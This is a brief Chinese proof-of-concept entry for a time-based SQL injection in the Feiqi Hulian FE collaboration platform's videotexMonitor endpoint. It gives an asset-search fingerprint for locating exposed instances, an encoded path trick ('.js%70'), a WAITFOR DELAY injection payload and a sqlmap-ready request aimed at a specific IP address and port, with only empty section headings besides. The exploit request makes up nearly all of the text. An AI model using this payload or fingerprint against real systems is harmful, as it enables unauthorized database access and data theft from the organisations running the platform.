# 飞企互联FE业务协作平台videotexMonitor存在SQL注入漏洞

- **系统**：飞企互联FE业务协作平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`POST /cooperate/videotexMonitor.js%70 HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
master_key=111&flowcode=1111%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&dialogid=11111

sqlmap
POST /cooperate/videotexMonitor.js%70 HTTP/1.1
Host: 14.123.236.201:8000
Content-Type: application/x-www-form-urlencoded
master_key=111&flowcode=1111&dialogid=11111
```

**其他**
- 飞企互联FE业务协作平台videotexMonitor存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 飞企互联FE业务协作平台